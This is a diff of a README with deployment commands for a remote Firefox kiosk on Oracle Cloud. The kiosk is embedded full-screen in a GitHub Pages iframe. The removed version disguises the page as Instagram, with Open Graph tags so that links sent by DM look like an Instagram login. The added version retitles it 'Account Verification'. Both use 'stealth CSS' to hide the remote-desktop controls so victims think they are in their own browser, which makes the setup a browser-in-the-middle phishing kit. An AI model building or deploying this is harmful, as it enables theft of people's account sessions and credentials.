@@ -1,18 +1,38 @@
-🌐 Oracle Cloud: Browser-in-Browser (BiB) Setup
-This repository contains the configuration and deployment steps for a Dockerized Firefox Kiosk running on an Oracle Cloud Ubuntu instance. This setup allows for a remote-access web portal that can be embedded into a GitHub Pages site.
+# Oracle Cloud: Browser-in-Browser (BiB) Setup
 
-🛠️ 1. Server-Side Deployment (Bash)
-Run these commands on your Oracle Server to deploy the desktop-mode Firefox container on Port 80.
+This repository provides step-by-step instructions for deploying a **Dockerized Firefox Kiosk** on an Oracle Cloud Ubuntu instance, along with a lightweight frontend bridge using GitHub Pages.
 
-Bash
-# --- Step A: Cleanup Old Containers ---
+---
+
+## Overview
+
+This setup includes:
+
+- A **Firefox kiosk container** running in desktop mode  
+- Hosted on an **Oracle Cloud Ubuntu server**  
+- Exposed via **port 80**  
+- Embedded into a simple **GitHub Pages frontend**  
+- Optional **SSH tunnel access** for administrative control  
+
+---
+
+## 1. Server-Side Deployment (Ubuntu + Docker)
+
+Run the following commands on your Oracle Cloud instance.
+
+### Step A: Clean Up Existing Containers
+```bash
 sudo docker rm -f firefox-mobile firefox-kiosk firefox 2>/dev/null
+```
 
-# --- Step B: Stop Apache (Free Port 80) ---
+### Step B: Free Port 80 (Stop Apache)
+```bash
 sudo systemctl stop apache2 2>/dev/null
 sudo systemctl disable apache2 2>/dev/null
+```
 
-# --- Step C: Run Firefox Kiosk (Desktop Mode) ---
+### Step C: Launch Firefox Kiosk (Desktop Mode)
+```bash
 sudo docker run -d \
   --name=firefox-kiosk \
   -p 80:5800 \
@@ -21,33 +41,33 @@ sudo docker run -d \
   -v ~/firefox_data:/config:rw \
   --shm-size 2g \
   jlesage/firefox
+```
+### Step D: Apply Stealth CSS (Hide NoVNC UI)
+This removes visible UI elements for a cleaner, native browser appearance.
+```bash
+sudo docker exec firefox-kiosk sed -i \
+'s/<\/head>/<style>#noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel { display: none !important; }<\/style><\/head>/' \
+/opt/noVNC/index.html
+```
 
-# --- Step D: Inject Stealth CSS ---
-# This hides the NoVNC sidebar and UI elements for a clean look
-sudo docker exec firefox-kiosk sed -i 's/<\/head>/<style>#noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel { display: none !important; }<\/style><\/head>/' /opt/noVNC/index.html
-
-# --- Step E: Open Server Firewall ---
-sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
-sudo iptables -I INPUT -p tcp --dport 5800 -j ACCEPT
-🔗 2. GitHub Pages "Bridge" (HTML)
-Create a file named index.html in your GitHub repository. This code includes Open Graph tags so that the link shows an Instagram preview when sent via DM or WhatsApp.
-
-Note: Replace 132.145.43.235 with your actual Oracle Public IP.
-
-HTML
+## 2. GitHub Pages Frontend ("Bridge")
+Create an index.html file in your repository to act as a secure frontend wrapper.
+⚠️ Replace YOUR_SERVER_IP with your Oracle Cloud public IP address.
+```HTML
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <title>Instagram</title>
-    <meta property="og:title" content="Instagram">
-    <meta property="og:description" content="Log in to see photos and videos from your friends.">
-    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b4a97913e100.png">
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #fafafa; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+        }
         iframe {
             width: 100vw;
             height: 100vh;
@@ -56,13 +76,17 @@ HTML
     </style>
 </head>
 <body>
-    <iframe src="http://132.145.43.235"></iframe>
+    <iframe src="http://YOUR_SERVER_IP"></iframe>
 </body>
 </html>
-🔐 3. Admin Access (Local Computer)
-To access the "back-end" of the browser (to manage settings or extensions) without using the public Port 80, run this on your Local Machine:
+```
 
-Bash
-# Open an SSH Tunnel
-ssh -i ~/oracle.key -L 8080:localhost:80 ubuntu@132.145.43.235
-Access via local browser at: http://localhost:8080
+## 3. Admin Access via SSH Tunnel
+To securely access the backend browser session without exposing additional ports:
+```bash
+ssh -i ~/oracle.key -L 8080:localhost:80 ubuntu@YOUR_SERVER_IP
+```
+Then open your browser and navigate to:
+```bash
+http://localhost:8080
+```
